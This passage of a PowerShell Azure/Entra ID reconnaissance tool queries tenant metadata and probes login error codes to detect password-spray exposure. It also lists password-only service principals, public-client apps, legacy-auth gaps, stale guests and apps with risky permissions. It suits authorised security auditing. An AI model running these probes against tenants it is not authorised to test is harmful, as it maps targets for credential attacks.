    Write-ColorOutput -Message "[*] Querying OpenID configuration endpoints..." -Color "Yellow"
    
    try {
        # Query the tenant-specific OpenID configuration endpoint
        $openIdConfig = Invoke-RestMethod -Uri $openIdConfigUrl -Method Get -ErrorAction Stop
        
        Write-ColorOutput -Message "[+] Successfully retrieved tenant configuration`n" -Color "Green"
        
        # Extract tenant ID from the issuer or token_endpoint
        $tenantId = $null
        if ($openIdConfig.issuer) {
            if ($openIdConfig.issuer -match '([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})') {
                $tenantId = $matches[1]
            }
        }
        
        # Determine federation status
        $isFederated = $false
        if ($openIdConfig.tenant_region_scope -or $openIdConfig.tenant_region_sub_scope) {
            $isFederated = $true
        }
        
        # Format output in netexec style
        Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Tenant Discovery" -Color "Cyan"
        Write-ColorOutput -Message ""
        
        # Display key information
        if ($tenantId) {
            Write-ColorOutput -Message "    [+] Tenant ID:                $tenantId" -Color "Green"
        }
        
        if ($openIdConfig.issuer) {
            Write-ColorOutput -Message "    [+] Issuer:                   $($openIdConfig.issuer)" -Color "Cyan"
        }
        
        if ($openIdConfig.authorization_endpoint) {
            Write-ColorOutput -Message "    [+] Authorization Endpoint:   $($openIdConfig.authorization_endpoint)" -Color "Cyan"
        }
        
        if ($openIdConfig.token_endpoint) {
            Write-ColorOutput -Message "    [+] Token Endpoint:           $($openIdConfig.token_endpoint)" -Color "Cyan"
        }
        
        if ($openIdConfig.userinfo_endpoint) {
            Write-ColorOutput -Message "    [+] UserInfo Endpoint:        $($openIdConfig.userinfo_endpoint)" -Color "Cyan"
        }
        
        if ($openIdConfig.end_session_endpoint) {
            Write-ColorOutput -Message "    [+] End Session Endpoint:     $($openIdConfig.end_session_endpoint)" -Color "Cyan"
        }
        
        if ($openIdConfig.jwks_uri) {
            Write-ColorOutput -Message "    [+] JWKS URI:                 $($openIdConfig.jwks_uri)" -Color "Cyan"
        }
        
        if ($openIdConfig.tenant_region_scope) {
            Write-ColorOutput -Message "    [+] Tenant Region Scope:      $($openIdConfig.tenant_region_scope)" -Color "Cyan"
        }
        
        if ($openIdConfig.tenant_region_sub_scope) {
            Write-ColorOutput -Message "    [+] Tenant Region SubScope:   $($openIdConfig.tenant_region_sub_scope)" -Color "Cyan"
        }
        
        if ($openIdConfig.cloud_instance_name) {
            Write-ColorOutput -Message "    [+] Cloud Instance:           $($openIdConfig.cloud_instance_name)" -Color "Cyan"
        }
        
        if ($openIdConfig.cloud_graph_host_name) {
            Write-ColorOutput -Message "    [+] Graph Host:               $($openIdConfig.cloud_graph_host_name)" -Color "Cyan"
        }
        
        Write-ColorOutput -Message "    [+] Federation Status:        $(if ($isFederated) { 'Federated' } else { 'Managed' })" -Color $(if ($isFederated) { "Yellow" } else { "Green" })
        
        # Additional metadata
        Write-ColorOutput -Message "`n    [*] Supported Response Types: $($openIdConfig.response_types_supported -join ', ')" -Color "DarkGray"
        Write-ColorOutput -Message "    [*] Supported Scopes:         $($openIdConfig.scopes_supported -join ', ')" -Color "DarkGray"
        Write-ColorOutput -Message "    [*] Supported Claims:         $($openIdConfig.claims_supported.Count) claims available" -Color "DarkGray"
        
        # Enumerate exposed applications and misconfigurations
        Write-ColorOutput -Message "`n[*] Enumerating exposed applications and configurations..." -Color "Yellow"
        
        $exposedApps = @()
        $exposedRedirectUris = @()
        $misconfigurations = @()
        
        # Check for common OpenID misconfigurations
        if ($openIdConfig.response_types_supported -contains "token" -or 
            $openIdConfig.response_types_supported -contains "id_token token") {
            $misconfigurations += "Implicit flow enabled (potential security risk)"
            Write-ColorOutput -Message "    [!] Implicit flow enabled (security consideration)" -Color "Yellow"
        }
        
        # Check for exposed redirect URIs in the configuration
        if ($openIdConfig.PSObject.Properties.Name -contains "redirect_uris") {
            $exposedRedirectUris = $openIdConfig.redirect_uris
            Write-ColorOutput -Message "    [!] Found $($exposedRedirectUris.Count) exposed redirect URI(s)" -Color "Yellow"
            foreach ($uri in $exposedRedirectUris) {
                Write-ColorOutput -Message "        - $uri" -Color "Cyan"
            }
        }
        
        # Try to enumerate federation metadata (for federated tenants)
        if ($isFederated) {
            Write-ColorOutput -Message "`n[*] Attempting to retrieve federation metadata..." -Color "Yellow"
            $federationMetadataUrl = "https://login.microsoftonline.com/$Domain/FederationMetadata/2007-06/FederationMetadata.xml"
            
            try {
                $fedMetadata = Invoke-RestMethod -Uri $federationMetadataUrl -Method Get -ErrorAction SilentlyContinue
                if ($fedMetadata) {
                    Write-ColorOutput -Message "    [+] Federation metadata accessible" -Color "Green"
                    
                    # Extract entity IDs and endpoints from federation metadata
                    if ($fedMetadata.EntityDescriptor) {
                        $entityId = $fedMetadata.EntityDescriptor.entityID
                        Write-ColorOutput -Message "    [+] Federation Entity ID: $entityId" -Color "Cyan"
                    }
                }
            } catch {
                # Silent catch - federation metadata may not be available
            }
        }
        
        # Check common v2.0 endpoint for additional metadata
        try {
            $commonConfig = Invoke-RestMethod -Uri $commonOpenIdConfigUrl -Method Get -ErrorAction SilentlyContinue
            if ($commonConfig) {
                # Compare configurations to identify tenant-specific settings
                $differences = @()
                
                # Check for additional grant types
                if ($openIdConfig.PSObject.Properties.Name -contains "grant_types_supported") {
                    Write-ColorOutput -Message "`n    [*] Supported Grant Types:" -Color "DarkGray"
                    foreach ($grantType in $openIdConfig.grant_types_supported) {
                        Write-ColorOutput -Message "        - $grantType" -Color "DarkGray"
                        
                        # Flag potentially risky grant types
                        if ($grantType -eq "password" -or $grantType -eq "client_credentials") {
                            Write-ColorOutput -Message "          [!] Note: $grantType grant type enabled" -Color "Yellow"
                        }
                    }
                }
            }
        } catch {
            # Silent catch
        }
        
        # Try to probe for exposed application endpoints
        Write-ColorOutput -Message "`n[*] Probing for exposed application information..." -Color "Yellow"
        
        # Check for app registration endpoint exposure
        $appEndpoints = @(
            "https://graph.microsoft.com/.well-known/openid-configuration",
            "https://management.azure.com/metadata/endpoints?api-version=2021-01-01"
        )
        
        foreach ($endpoint in $appEndpoints) {
            try {
                $response = Invoke-RestMethod -Uri $endpoint -Method Get -ErrorAction SilentlyContinue -TimeoutSec 5
                if ($response) {
                    Write-ColorOutput -Message "    [+] Accessible endpoint: $endpoint" -Color "Green"
                    
                    # Extract any exposed client IDs or app IDs
                    if ($response.PSObject.Properties.Name -contains "client_id") {
                        $exposedApps += $response.client_id
                    }
                }
            } catch {
                # Silent catch - endpoint not accessible
            }
        }
        
        # Summary of findings
        if ($exposedApps.Count -gt 0 -or $exposedRedirectUris.Count -gt 0 -or $misconfigurations.Count -gt 0) {
            Write-ColorOutput -Message "`n[*] Security Findings:" -Color "Yellow"
            
            if ($exposedApps.Count -gt 0) {
                Write-ColorOutput -Message "    [!] Exposed Application IDs: $($exposedApps.Count)" -Color "Yellow"
                foreach ($app in $exposedApps) {
                    Write-ColorOutput -Message "        - $app" -Color "Cyan"
                }
            }
            
            if ($exposedRedirectUris.Count -gt 0) {
                Write-ColorOutput -Message "    [!] Exposed Redirect URIs: $($exposedRedirectUris.Count)" -Color "Yellow"
            }
            
            if ($misconfigurations.Count -gt 0) {
                Write-ColorOutput -Message "    [!] Potential Misconfigurations: $($misconfigurations.Count)" -Color "Yellow"
                foreach ($config in $misconfigurations) {
                    Write-ColorOutput -Message "        - $config" -Color "Yellow"
                }
            }
        } else {
            Write-ColorOutput -Message "`n    [*] No exposed applications or obvious misconfigurations detected" -Color "Green"
        }
        
        # Export if requested
        if ($ExportPath) {
            try {
                $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
                
                $exportData = [PSCustomObject]@{
                    Domain                    = $Domain
                    TenantId                  = $tenantId
                    Issuer                    = $openIdConfig.issuer
                    AuthorizationEndpoint     = $openIdConfig.authorization_endpoint
                    TokenEndpoint             = $openIdConfig.token_endpoint
                    UserInfoEndpoint          = $openIdConfig.userinfo_endpoint
                    EndSessionEndpoint        = $openIdConfig.end_session_endpoint
                    JwksUri                   = $openIdConfig.jwks_uri
                    TenantRegionScope         = $openIdConfig.tenant_region_scope
                    TenantRegionSubScope      = $openIdConfig.tenant_region_sub_scope
                    CloudInstanceName         = $openIdConfig.cloud_instance_name
                    CloudGraphHostName        = $openIdConfig.cloud_graph_host_name
                    FederationStatus          = if ($isFederated) { "Federated" } else { "Managed" }
                    ResponseTypesSupported    = $openIdConfig.response_types_supported
                    ScopesSupported           = $openIdConfig.scopes_supported
                    ClaimsSupported           = $openIdConfig.claims_supported
                    ExposedApplications       = $exposedApps
                    ExposedRedirectUris       = $exposedRedirectUris
                    PotentialMisconfigurations = $misconfigurations
                    FullConfiguration         = $openIdConfig
                }
                
                if ($extension -eq ".csv") {
                    $exportData | Select-Object -Property * -ExcludeProperty FullConfiguration,ExposedApplications,ExposedRedirectUris,PotentialMisconfigurations | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                } elseif ($extension -eq ".json") {
                    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                } else {
                    # Default to JSON
                    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                }
                
                Write-ColorOutput -Message "`n[+] Tenant information exported to: $ExportPath" -Color "Green"
            } catch {
                Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
            }
        }
        
        Write-ColorOutput -Message "`n[*] Tenant discovery complete!" -Color "Green"
        
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve tenant configuration" -Color "Red"
        Write-ColorOutput -Message "[!] Error: $_" -Color "Red"
        
        # Check if it's a 400 error (invalid tenant)
        if ($_.Exception.Response.StatusCode -eq 400) {
            Write-ColorOutput -Message "[!] The specified domain does not appear to be a valid Azure/Entra tenant" -Color "Yellow"
        }
    }
}

# Enumerate vulnerable targets (Azure equivalent of --gen-relay-list)
function Invoke-VulnListEnumeration {
    param(
        [string]$Domain,
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Vulnerable Target Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Vuln-List (Azure Relay Target Equivalent)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Similar to: nxc smb 192.168.1.0/24 --gen-relay-list`n" -Color "Yellow"
    
    $vulnTargets = @()
    $unauthFindings = @()
    $authFindings = @()
    
    # ============================================
    # PHASE 1: UNAUTHENTICATED CHECKS
    # ============================================
    Write-ColorOutput -Message "[*] PHASE 1: Unauthenticated Enumeration" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Auto-detect domain if not provided
    if (-not $Domain) {
        Write-ColorOutput -Message "[*] No domain specified, attempting to auto-detect..." -Color "Yellow"
        
        $detectedDomain = $null
        
        try {
            # Method 1: Try to get UPN from whoami command (Windows)
            if ($IsWindows -or $PSVersionTable.PSVersion.Major -le 5) {
                $upn = whoami /upn 2>$null
                if ($upn -and $upn -match '@(.+)$') {
                    $detectedDomain = $matches[1]
                    Write-ColorOutput -Message "[+] Detected domain from UPN: $detectedDomain" -Color "Green"
                }
            }
            
            # Method 2: Try environment variable for USERDNSDOMAIN
            if (-not $detectedDomain) {
                $envDomain = [System.Environment]::GetEnvironmentVariable("USERDNSDOMAIN")
                if ($envDomain) {
                    $detectedDomain = $envDomain
                    Write-ColorOutput -Message "[+] Detected domain from environment: $detectedDomain" -Color "Green"
                }
            }
            
            # Method 3: Try to get domain from current user's email-like username
            if (-not $detectedDomain) {
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                if ($currentUser -match '@(.+)$') {
                    $detectedDomain = $matches[1]
                    Write-ColorOutput -Message "[+] Detected domain from username: $detectedDomain" -Color "Green"
                }
            }
            
            # Method 4: Check if already connected to Graph
            if (-not $detectedDomain) {
                try {
                    $context = Get-MgContext -ErrorAction SilentlyContinue
                    if ($context -and $context.Account -match '@(.+)$') {
                        $detectedDomain = $matches[1]
                        Write-ColorOutput -Message "[+] Detected domain from Graph context: $detectedDomain" -Color "Green"
                    }
                } catch {
                    # Silent - Graph not connected yet
                }
            }
        } catch {
            # Silent catch - we'll handle the error below
        }
        
        if ($detectedDomain) {
            $Domain = $detectedDomain
            Write-ColorOutput -Message "[+] Using auto-detected domain: $Domain`n" -Color "Green"
        } else {
            Write-ColorOutput -Message "[!] Could not auto-detect domain" -Color "Yellow"
            Write-ColorOutput -Message "[*] Skipping domain-specific unauthenticated checks" -Color "Yellow"
            Write-ColorOutput -Message "[*] Use -Domain parameter for full enumeration`n" -Color "DarkGray"
        }
    }
    
    # 1.1 Check tenant configuration (unauthenticated)
    if ($Domain) {
        Write-ColorOutput -Message "[*] Checking tenant configuration for: $Domain" -Color "Yellow"
        
        $openIdConfigUrl = "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration"
        
        try {
            $openIdConfig = Invoke-RestMethod -Uri $openIdConfigUrl -Method Get -ErrorAction Stop
            
            # Extract tenant ID
            $tenantId = $null
            if ($openIdConfig.issuer -match '([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})') {
                $tenantId = $matches[1]
            }
            
            Write-ColorOutput -Message "    [+] Tenant ID: $tenantId" -Color "Green"
            
            # Check for implicit flow (OAuth misconfiguration)
            if ($openIdConfig.response_types_supported -contains "token" -or 
                $openIdConfig.response_types_supported -contains "id_token token") {
                $finding = [PSCustomObject]@{
                    Type = "TenantConfig"
                    Target = $Domain
                    Vulnerability = "ImplicitFlowEnabled"
                    Risk = "MEDIUM"
                    Description = "Implicit OAuth flow enabled - potential token theft risk"
                    Authenticated = $false
                }
                $unauthFindings += $finding
                Write-ColorOutput -Message "    [!] IMPLICIT FLOW ENABLED - Token theft risk" -Color "Yellow"
            }
            
        } catch {
            Write-ColorOutput -Message "    [!] Could not retrieve tenant configuration" -Color "Red"
        }
        
        # 1.2 Check external collaboration / guest access settings
        Write-ColorOutput -Message "`n[*] Testing guest/external authentication..." -Color "Yellow"
        
        $guestTestUrl = "https://login.microsoftonline.com/$Domain/oauth2/v2.0/token"
        $testBody = @{
            client_id     = "1b730954-1685-4b74-9bfd-dac224a7b894"  # Azure PowerShell client
            grant_type    = "password"
            username      = "nonexistent_test_user_12345@$Domain"
            password      = "TestPassword123!"
            scope         = "https://graph.microsoft.com/.default"
        }
        
        try {
            $null = Invoke-RestMethod -Uri $guestTestUrl -Method Post -Body $testBody -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
        } catch {
            $errorResponse = $_.ErrorDetails.Message | ConvertFrom-Json -ErrorAction SilentlyContinue
            
            if ($errorResponse.error -eq "invalid_grant") {
                $errorDesc = $errorResponse.error_description
                
                # AADSTS50034 = user doesn't exist (but tenant accepts ROPC)
                if ($errorDesc -match "AADSTS50034") {
                    $finding = [PSCustomObject]@{
                        Type = "TenantConfig"
                        Target = $Domain
                        Vulnerability = "ROPCEnabled"
                        Risk = "HIGH"
                        Description = "Resource Owner Password Credentials (ROPC) flow accepted - Password spray possible"
                        Authenticated = $false
                    }
                    $unauthFindings += $finding
                    Write-ColorOutput -Message "    [!] ROPC ENABLED - Password spray/brute force possible" -Color "Red"
                }
                
                # AADSTS50053 = account locked (but ROPC works)
                if ($errorDesc -match "AADSTS50053") {
                    $finding = [PSCustomObject]@{
                        Type = "TenantConfig"
                        Target = $Domain
                        Vulnerability = "ROPCEnabled"
                        Risk = "HIGH"
                        Description = "ROPC flow accepted (account lockout detected)"
                        Authenticated = $false
                    }
                    $unauthFindings += $finding
                    Write-ColorOutput -Message "    [!] ROPC ENABLED - Account lockout policy detected" -Color "Yellow"
                }
                
                # AADSTS50126 = invalid password (ROPC works, user exists)
                if ($errorDesc -match "AADSTS50126") {
                    Write-ColorOutput -Message "    [+] ROPC enabled, user validation possible" -Color "Green"
                }
            }
            
            # AADSTS7000218 = ROPC disabled (good security)
            if ($_.ErrorDetails.Message -match "AADSTS7000218") {
                Write-ColorOutput -Message "    [+] ROPC DISABLED - Good security posture" -Color "Green"
            }
        }
        
        # 1.3 Check for legacy authentication endpoints
        Write-ColorOutput -Message "`n[*] Checking legacy authentication endpoints..." -Color "Yellow"
        
        $legacyEndpoints = @(
            @{ Name = "Exchange ActiveSync"; Url = "https://outlook.office365.com/Microsoft-Server-ActiveSync"; Method = "OPTIONS" },
            @{ Name = "Autodiscover"; Url = "https://autodiscover.$Domain/autodiscover/autodiscover.xml"; Method = "GET" },
            @{ Name = "EWS"; Url = "https://outlook.office365.com/EWS/Exchange.asmx"; Method = "OPTIONS" }
        )
        
        foreach ($endpoint in $legacyEndpoints) {
            try {
                $response = Invoke-WebRequest -Uri $endpoint.Url -Method $endpoint.Method -TimeoutSec 5 -ErrorAction SilentlyContinue -UseBasicParsing
                if ($response.StatusCode -in @(200, 401, 403)) {
                    Write-ColorOutput -Message "    [*] $($endpoint.Name) endpoint accessible" -Color "DarkGray"
                }
            } catch {
                if ($_.Exception.Response.StatusCode -eq 401) {
                    Write-ColorOutput -Message "    [*] $($endpoint.Name) endpoint accessible (requires auth)" -Color "DarkGray"
                }
            }
        }
    }
    
    # ============================================
    # PHASE 2: AUTHENTICATED CHECKS
    # ============================================
    Write-ColorOutput -Message "`n[*] PHASE 2: Authenticated Enumeration" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Check if we can connect to Graph
    $graphConnected = $false
    try {
        $context = Get-MgContext -ErrorAction SilentlyContinue
        if ($context) {
            $graphConnected = $true
            Write-ColorOutput -Message "[+] Using existing Graph connection: $($context.Account)" -Color "Green"
        }
    } catch {
        # Not connected yet
    }
    
    if (-not $graphConnected) {
        Write-ColorOutput -Message "[*] Attempting to connect to Microsoft Graph..." -Color "Yellow"
        try {
            # Request scopes needed for vuln enumeration
            Connect-MgGraph -Scopes "Application.Read.All","Directory.Read.All","Policy.Read.All","AuditLog.Read.All" -ErrorAction Stop
            $context = Get-MgContext
            $graphConnected = $true
            Write-ColorOutput -Message "[+] Connected as: $($context.Account)" -Color "Green"
            
            # Check if user is a guest
            $isGuest = Test-IsGuestUser -UserPrincipalName $context.Account
            if ($isGuest) {
                Write-ColorOutput -Message "[!] GUEST USER - Some enumeration may be restricted`n" -Color "Yellow"
            }
        } catch {
            Write-ColorOutput -Message "[!] Could not connect to Microsoft Graph" -Color "Yellow"
            Write-ColorOutput -Message "[*] Authenticated checks will be skipped" -Color "DarkGray"
            Write-ColorOutput -Message "[*] Error: $($_.Exception.Message)" -Color "DarkGray"
        }
    }
    
    if ($graphConnected) {
        Write-ColorOutput -Message ""
        
        # 2.1 Service Principals with Password Credentials (HIGH VALUE)
        Write-ColorOutput -Message "[*] Enumerating Service Principals with password credentials..." -Color "Yellow"
        Write-ColorOutput -Message "    (Like SMB hosts without signing - weaker authentication)" -Color "DarkGray"
        
        try {
            $servicePrincipals = Get-MgServicePrincipal -All -Property "id,displayName,appId,passwordCredentials,keyCredentials,servicePrincipalType" -ErrorAction Stop
            
            $passwordOnlyCount = 0
            foreach ($sp in $servicePrincipals) {
                $hasPasswordCred = $sp.PasswordCredentials.Count -gt 0
                $hasCertCred = $sp.KeyCredentials.Count -gt 0
                
                if ($hasPasswordCred -and -not $hasCertCred) {
                    # Password-only = VULNERABLE (like SMB signing disabled)
                    $finding = [PSCustomObject]@{
                        Type = "ServicePrincipal"
                        Target = $sp.DisplayName
                        AppId = $sp.AppId
                        ObjectId = $sp.Id
                        Vulnerability = "PasswordCredentialOnly"
                        Risk = "HIGH"
                        Description = "Uses password credential without certificate - vulnerable to credential theft"
                        Authenticated = $true
                        CredentialCount = $sp.PasswordCredentials.Count
                        ExpiringCredentials = ($sp.PasswordCredentials | Where-Object { $_.EndDateTime -lt (Get-Date).AddDays(30) }).Count
                    }
                    $authFindings += $finding
                    $passwordOnlyCount++
                    
                    if ($passwordOnlyCount -le 10) {
                        $expiring = if ($finding.ExpiringCredentials -gt 0) { " [EXPIRING SOON]" } else { "" }
                        Write-ColorOutput -Message "    [!] $($sp.DisplayName)$expiring" -Color "Red"
                        Write-ColorOutput -Message "        AppId: $($sp.AppId)" -Color "DarkGray"
                    }
                }
            }
            
            if ($passwordOnlyCount -gt 10) {
                Write-ColorOutput -Message "    ... and $($passwordOnlyCount - 10) more" -Color "DarkGray"
            }
            
            Write-ColorOutput -Message "`n    [*] Total password-only service principals: $passwordOnlyCount" -Color $(if ($passwordOnlyCount -gt 0) { "Yellow" } else { "Green" })
            
        } catch {
            if ($_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*Authorization*") {
                Write-ColorOutput -Message "    [!] Access Denied - Requires Application.Read.All permission" -Color "Yellow"
            } else {
                Write-ColorOutput -Message "    [!] Error: $($_.Exception.Message)" -Color "Red"
            }
        }
        
        # 2.2 Applications with Public Client enabled (ROPC vulnerable)
        Write-ColorOutput -Message "`n[*] Enumerating applications with public client flows enabled..." -Color "Yellow"
        Write-ColorOutput -Message "    (Allows ROPC - direct username/password authentication)" -Color "DarkGray"
        
        try {
            $apps = Get-MgApplication -All -Property "id,displayName,appId,isFallbackPublicClient,publicClient,signInAudience,requiredResourceAccess" -ErrorAction Stop
            
            $publicClientCount = 0
            foreach ($app in $apps) {
                $isPublicClient = $app.IsFallbackPublicClient -eq $true -or ($app.PublicClient -and $app.PublicClient.RedirectUris.Count -gt 0)
                
                if ($isPublicClient) {
                    # Check for dangerous permissions
                    $dangerousPerms = @()
                    foreach ($resource in $app.RequiredResourceAccess) {
                        foreach ($perm in $resource.ResourceAccess) {
                            if ($perm.Type -eq "Role") {
                                $dangerousPerms += "AppRole"
                            }
                        }
                    }
                    
                    $risk = if ($dangerousPerms.Count -gt 0) { "HIGH" } else { "MEDIUM" }
                    
                    $finding = [PSCustomObject]@{
                        Type = "Application"
                        Target = $app.DisplayName
                        AppId = $app.AppId
                        ObjectId = $app.Id
                        Vulnerability = "PublicClientEnabled"
                        Risk = $risk
                        Description = "Public client flow enabled - ROPC authentication possible"
                        Authenticated = $true
                        SignInAudience = $app.SignInAudience
                        HasAppRoles = $dangerousPerms.Count -gt 0
                    }
                    $authFindings += $finding
                    $publicClientCount++
                    
                    if ($publicClientCount -le 10) {
                        $riskColor = if ($risk -eq "HIGH") { "Red" } else { "Yellow" }
                        Write-ColorOutput -Message "    [!] $($app.DisplayName) [$risk]" -Color $riskColor
                        Write-ColorOutput -Message "        AppId: $($app.AppId) | Audience: $($app.SignInAudience)" -Color "DarkGray"
                    }
                }
            }
            
            if ($publicClientCount -gt 10) {
                Write-ColorOutput -Message "    ... and $($publicClientCount - 10) more" -Color "DarkGray"
            }
            
            Write-ColorOutput -Message "`n    [*] Total public client applications: $publicClientCount" -Color $(if ($publicClientCount -gt 0) { "Yellow" } else { "Green" })
            
        } catch {
            if ($_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*Authorization*") {
                Write-ColorOutput -Message "    [!] Access Denied - Requires Application.Read.All permission" -Color "Yellow"
            } else {
                Write-ColorOutput -Message "    [!] Error: $($_.Exception.Message)" -Color "Red"
            }
        }
        
        # 2.3 Check Security Defaults status
        Write-ColorOutput -Message "`n[*] Checking Security Defaults and Conditional Access..." -Color "Yellow"
        
        try {
            $securityDefaults = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/policies/identitySecurityDefaultsEnforcementPolicy" -Method GET -ErrorAction Stop
            
            if ($securityDefaults.isEnabled -eq $false) {
                $finding = [PSCustomObject]@{
                    Type = "Policy"
                    Target = "SecurityDefaults"
                    Vulnerability = "SecurityDefaultsDisabled"
                    Risk = "MEDIUM"
                    Description = "Security Defaults disabled - check for Conditional Access coverage"
                    Authenticated = $true
                }
                $authFindings += $finding
                Write-ColorOutput -Message "    [!] SECURITY DEFAULTS DISABLED" -Color "Yellow"
                Write-ColorOutput -Message "        Check if Conditional Access provides equivalent protection" -Color "DarkGray"
            } else {
                Write-ColorOutput -Message "    [+] Security Defaults ENABLED - Good baseline" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "    [!] Could not check Security Defaults (requires Policy.Read.All)" -Color "DarkGray"
        }
        
        # 2.4 Check for legacy authentication in Conditional Access
        try {
            $caPolicies = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" -Method GET -ErrorAction Stop
            
            $legacyAuthBlocked = $false
            foreach ($policy in $caPolicies.value) {
                if ($policy.conditions.clientAppTypes -contains "exchangeActiveSync" -or 
                    $policy.conditions.clientAppTypes -contains "other") {
                    if ($policy.grantControls.builtInControls -contains "block" -and $policy.state -eq "enabled") {
                        $legacyAuthBlocked = $true
                    }
                }
            }
            
            if (-not $legacyAuthBlocked) {
                $finding = [PSCustomObject]@{
                    Type = "Policy"
                    Target = "ConditionalAccess"
                    Vulnerability = "LegacyAuthNotBlocked"
                    Risk = "HIGH"
                    Description = "No Conditional Access policy blocking legacy authentication - MFA bypass possible"
                    Authenticated = $true
                }
                $authFindings += $finding
                Write-ColorOutput -Message "    [!] LEGACY AUTH NOT BLOCKED - MFA bypass possible" -Color "Red"
            } else {
                Write-ColorOutput -Message "    [+] Legacy authentication blocked by Conditional Access" -Color "Green"
            }
            
            Write-ColorOutput -Message "    [*] Found $($caPolicies.value.Count) Conditional Access policies" -Color "DarkGray"
            
        } catch {
            Write-ColorOutput -Message "    [!] Could not enumerate Conditional Access (requires Policy.Read.All)" -Color "DarkGray"
        }
        
        # 2.5 Enumerate guest users with potentially excessive permissions
        Write-ColorOutput -Message "`n[*] Enumerating guest users..." -Color "Yellow"
        Write-ColorOutput -Message "    (External users = potential 'null session' equivalent)" -Color "DarkGray"
        
        try {
            $guestUsers = Get-MgUser -Filter "userType eq 'Guest'" -All -Property "id,displayName,userPrincipalName,createdDateTime,signInActivity" -ErrorAction Stop
            
            $staleGuestCount = 0
            $activeGuestCount = 0
            $cutoffDate = (Get-Date).AddDays(-90)
            
            foreach ($guest in $guestUsers) {
                $lastSignIn = $guest.SignInActivity.LastSignInDateTime
                $isStale = (-not $lastSignIn) -or ($lastSignIn -lt $cutoffDate)
                
                if ($isStale) {
                    $staleGuestCount++
                    if ($staleGuestCount -le 5) {
                        $finding = [PSCustomObject]@{
                            Type = "User"
                            Target = $guest.DisplayName
                            UPN = $guest.UserPrincipalName
                            Vulnerability = "StaleGuestAccount"
                            Risk = "MEDIUM"
                            Description = "Guest account with no recent sign-in activity"
                            Authenticated = $true
                            LastSignIn = $lastSignIn
                            CreatedDate = $guest.CreatedDateTime
                        }
                        $authFindings += $finding
                    }
                } else {
                    $activeGuestCount++
                }
            }
            
            Write-ColorOutput -Message "    [*] Total guest users: $($guestUsers.Count)" -Color "Cyan"
            Write-ColorOutput -Message "    [*] Active guests (90 days): $activeGuestCount" -Color "Cyan"
            if ($staleGuestCount -gt 0) {
                Write-ColorOutput -Message "    [!] Stale guests (no activity 90+ days): $staleGuestCount" -Color "Yellow"
            }
            
        } catch {
            if ($_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*") {
                Write-ColorOutput -Message "    [!] Access Denied - Guest enumeration restricted" -Color "Yellow"
            } else {
                Write-ColorOutput -Message "    [!] Error: $($_.Exception.Message)" -Color "DarkGray"
            }
        }
        
        # 2.6 Check for apps with dangerous permissions
        Write-ColorOutput -Message "`n[*] Checking for applications with dangerous API permissions..." -Color "Yellow"
        
        try {
            $dangerousPermissions = @(
                "RoleManagement.ReadWrite.Directory",
                "AppRoleAssignment.ReadWrite.All", 
                "Application.ReadWrite.All",
                "Directory.ReadWrite.All",
                "Mail.ReadWrite",
                "Mail.Send",
                "Files.ReadWrite.All",
                "Sites.ReadWrite.All",
                "User.ReadWrite.All"
            )
            
            $oauth2Grants = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" -Method GET -ErrorAction Stop
            
            $dangerousGrantCount = 0
            foreach ($grant in $oauth2Grants.value) {
                $grantedScopes = $grant.scope -split ' '
                $dangerousScopes = $grantedScopes | Where-Object { $_ -in $dangerousPermissions }
                
                if ($dangerousScopes.Count -gt 0) {
                    # Get the app name
                    try {
                        $sp = Get-MgServicePrincipal -ServicePrincipalId $grant.clientId -Property "displayName" -ErrorAction SilentlyContinue
                        $appName = if ($sp) { $sp.DisplayName } else { $grant.clientId }
                    } catch {
                        $appName = $grant.clientId
                    }
                    
                    $finding = [PSCustomObject]@{
                        Type = "OAuth2Grant"
                        Target = $appName
                        ClientId = $grant.clientId
                        Vulnerability = "DangerousPermissions"
                        Risk = "HIGH"
                        Description = "Application has dangerous delegated permissions: $($dangerousScopes -join ', ')"
                        Authenticated = $true
                        Permissions = $dangerousScopes -join ', '
                        ConsentType = $grant.consentType
                    }
                    $authFindings += $finding
                    $dangerousGrantCount++
                    
                    if ($dangerousGrantCount -le 5) {
                        Write-ColorOutput -Message "    [!] $appName" -Color "Red"
                        Write-ColorOutput -Message "        Permissions: $($dangerousScopes -join ', ')" -Color "DarkGray"
                    }
                }
            }
            
            if ($dangerousGrantCount -gt 5) {
                Write-ColorOutput -Message "    ... and $($dangerousGrantCount - 5) more" -Color "DarkGray"
            }
            
            if ($dangerousGrantCount -eq 0) {
                Write-ColorOutput -Message "    [+] No applications with high-risk permissions found" -Color "Green"
            } else {
                Write-ColorOutput -Message "`n    [*] Total apps with dangerous permissions: $dangerousGrantCount" -Color "Yellow"
            }
            
        } catch {
            Write-ColorOutput -Message "    [!] Could not enumerate OAuth grants (requires Directory.Read.All)" -Color "DarkGray"
        }
        
        # 2.7 Check Guest User Permission Level (Authorization Policy)
        Write-ColorOutput -Message "`n[*] Checking guest user permission level..." -Color "Yellow"
